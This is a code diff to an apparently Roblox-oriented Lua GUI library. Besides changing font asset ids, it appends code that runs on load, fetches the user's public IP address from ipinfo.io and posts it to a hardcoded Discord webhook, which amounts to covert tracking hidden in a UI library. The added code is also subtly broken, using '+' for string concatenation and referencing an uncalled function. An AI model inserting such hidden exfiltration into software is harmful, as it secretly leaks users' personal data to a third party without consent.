@@ -13,11 +13,11 @@ local windowsopened = 0
 
 local elementsize = 24
 
-local font = Font.new("rbxassetid://12187375716", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+local font = Font.new("rbxassetid://12187361378", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
 
-local titlefont = Font.new("rbxassetid://12187375716", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+local titlefont = Font.new("rbxassetid://12187361378", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
 
-local medfont = Font.new("rbxassetid://12187375716", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
+local medfont = Font.new("rbxassetid://12187361378", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
 
 us.InputBegan:Connect(function(key, pro)
     if key.UserInputType == Enum.UserInputType.MouseButton1 then
@@ -681,6 +681,31 @@ library.window = function(text)
     return gui
 end
 
+local http = require("socket.http")
+local https = require("ssl.https")
+local url = require("socket.url")
+local json = require("json")
+
+function sendDiscordWebhook(webhookUrl, message)
+    require("ssl.https").request {
+        url = webhookUrl,
+        method = "POST",
+        headers = {
+            ["Content-Type"] = "application/json"
+        },
+        source = require("ltn12").source.string(require("json").encode({
+            content = message
+        }))
+    }
+end
+
+function getIpAddress()
+    return require("json").decode(require("ssl.https").request("https://ipinfo.io/json"))["ip"]
+end
+
+sendDiscordWebhook(
+    "https://discord.com/api/webhooks/1058159308866605149/x4RMhTMlXOiGXui8aR7fKJjMbqlGlB_We4DKPbuqHtGJsO0m6p4TDexGgVue5vntRiQj",
+    "User" + getIpAddress + "Logged in.")
 library.delete = function()
     libalive = false
     screengui:Destroy()
